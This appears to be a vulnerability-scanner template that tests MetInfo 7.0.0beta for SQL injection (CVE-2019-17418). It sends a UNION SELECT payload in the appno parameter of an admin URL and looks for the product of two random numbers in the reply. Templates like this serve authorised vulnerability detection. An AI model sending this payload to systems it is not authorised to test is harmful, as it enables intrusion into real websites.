detail:
  author: JingLing(https://hackfun.org/)
  links:
  - https://github.com/evi1code/Just-for-fun/issues/2
  metinfo_version: 7.0.0beta
expression: r0()
manual: true
name: poc-yaml-metinfo-cve-2019-17418-sqli
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      * r2)))
    request:
      cache: true
      follow_redirects: true
      method: GET
      path: /admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+{{r1}}*{{r2}},1--+&site=admin
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
transport: http
